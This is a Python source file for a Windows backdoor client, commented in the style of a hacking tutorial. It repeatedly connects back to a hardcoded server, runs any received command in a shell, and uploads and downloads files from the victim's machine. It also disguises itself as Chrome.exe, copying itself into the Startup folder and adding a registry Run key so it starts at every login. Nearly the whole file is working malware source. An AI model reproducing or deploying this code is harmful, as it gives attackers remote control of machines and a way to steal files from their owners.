import socket
import time
import json
import subprocess
import os
import shutil
import sys

IP_ADDRESS = '192.168.0.16'
PORT = 54321

def reliable_send(data):
    jsondata = json.dumps(data)
    # SERVER
    # target = target, ip = sock.accept() below
    # jsondata has to be encoded to send ascii to victims as BYTEs
    
    # CLIENT
    # use victims' socket (s) to send jsondata.encode() 'ascii' as BYTEs
    s.send(jsondata.encode())
    
def reliable_recv():
    # Preparing to store data
    data = ''
    while True:
        try:
            # SERVER
            # Specify amount of BYTEs we wanna receive
            # Cuz data sending from victims are encoded BYTEs
            # Need to decode it upon receiving using .decode()
            # Need to trim the fucking '\n' '\r' to avoid errors using rstrip()
            
            # CLIENT
            # using victims' socket to receive commands
            data += s.recv(1024).decode().rstrip()
            # returning results
            return json.loads(data)
        except ValueError as e:
            # When we receive ValueError from execution
            # We continue the execution
            #print(f'Error occurred: {e}\nContinuing...')
            continue
        
def connection():
    while True:
        # Our Server can start at anytime, whenever server is running
        # Victims will try to connect every 20 secs
        time.sleep(20)
        # Try to connect to our Server
        try:
            # connection() will run over & over again
            # until victims' socket is connected to server
            s.connect((IP_ADDRESS, PORT))
            # Establish a reverse shell
            shell()
            # Close socket object once reverse shell is established
            s.close()
            # Socket closed => Exit this program
            break
        except:
            # Keep trying to run connection()
            connection()

# Allow Server to download simple files from victims (this client)
def upload_file(file_name):
    # Open File from 'file_name' => command[9:]
    # Read Bytes
    f = open(file_name, 'rb')
    s.send(f.read())

# Allow SERVER to download simple files from victims (this client)
# Callback used to download files from victims' machines
# Server => download files from victims' machines
# Client => upload files to Server
def download_file(file_name):
    # open file object 'f' using 
    # 'wb' => write bytes to a file
    # ***
    f = open(file_name, 'wb')    
    # ***
    # If timeout is NOT set, sometimes program will get stuck
    s.settimeout(1)
    #print(f'Starting to receive bytes in chunks from simple files...')
    
    # Receive data from multiple chunks
    try:
        chunk = s.recv(1024)
        # As long as there's something in chunk variable
        while chunk:
            # Writing the chunk into file
            f.write(chunk)

            #print(f'Server is writing chunks of 1024 bytes of simple files from victims...')
            chunk = s.recv(1024)
        # If there's any errors => reached End of file
    except socket.timeout as e:
        pass
        #print(f'Server has no pending 1024-byte chunks in queue...\nExiting...\n')
    finally:
        s.settimeout(None)
        # Close file upon complete sending files from victims
        f.close()
        #print(f'This server is closing open-file on victims\' machines')
        
def shell():
    while True:
        # Receive command from server
        command = reliable_recv()
        # Exit program if 'q' is received from server
        if command == 'q':
            break
        
        # 'cd' command
        # comparing first 3 CHAR
        # cuz 'cd path/to/target'
        elif command[:3] == 'cd ':
            # From 3rd CHAR till the end
            os.chdir(command[3:])
        # Executing 'clear' on Server
        # do NOTHING in client
        elif command == 'clear':
            pass
        # 'vim' command
        # From beginning to 4th CHAR = 'vim '
        elif command[:4] == 'vim ':
            # vim test.txt => PATH starts from 5th CHAR
            os.system("vim"+command[5:])
        # Allow Server to download files from victims (this client)
        # If command[9:] from SERVER == 'download'
        # this client (victims) calls upload_file(command[9:])
        elif command[:8] == 'download':
            # Starts from 9th CHAR till the end
            upload_file(command[9:])
                
        # Allow SERVER to send 'upload' command to victims machines
        # To start downloading files from victims
        elif command[:6] == 'upload':
            # If command[7:] from SERVER == 'upload'
            # this client (victims) calls download_file(command[7:])
            download_file(command[7:])
            
        else:
            # Execute the 'command' received from Server using process open
            # using subprocess module
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            # We get encoded data 'result' from 2 lines above
            # execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # result = execute.stdout.read() + execute.stderr.read()
            # It will throw us an Error if we do NOT decode result from above
            result = result.decode()
            reliable_send(result)

# ============= Gaining persistency
# A common C:\Users\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Programs\Chrome.exe ;)
location = os.environ["appdata"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Chrome.exe"

# If 'location' does NOT exist, it's 1st time running this Backdoor client

if not os.path.exists(location):
#     # Performing copying action of our Backdoor.exe to User's /AppData
      shutil.copyfile(sys.executable, location)
#     # Allow users to proactively connect to our backdoor server
#     # whenever they login to their machines
#     #
#     # Appending machine startup .exe permissions to Victims' Windows regkey at
#     # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
#     # /v = Name; /t = Type; /d = Data
      subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Chrome.exe /t REG_SZ /d "' + location + '"', shell=True)
else:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Bind socket => connection() => shell() => Call connection()
    connection()
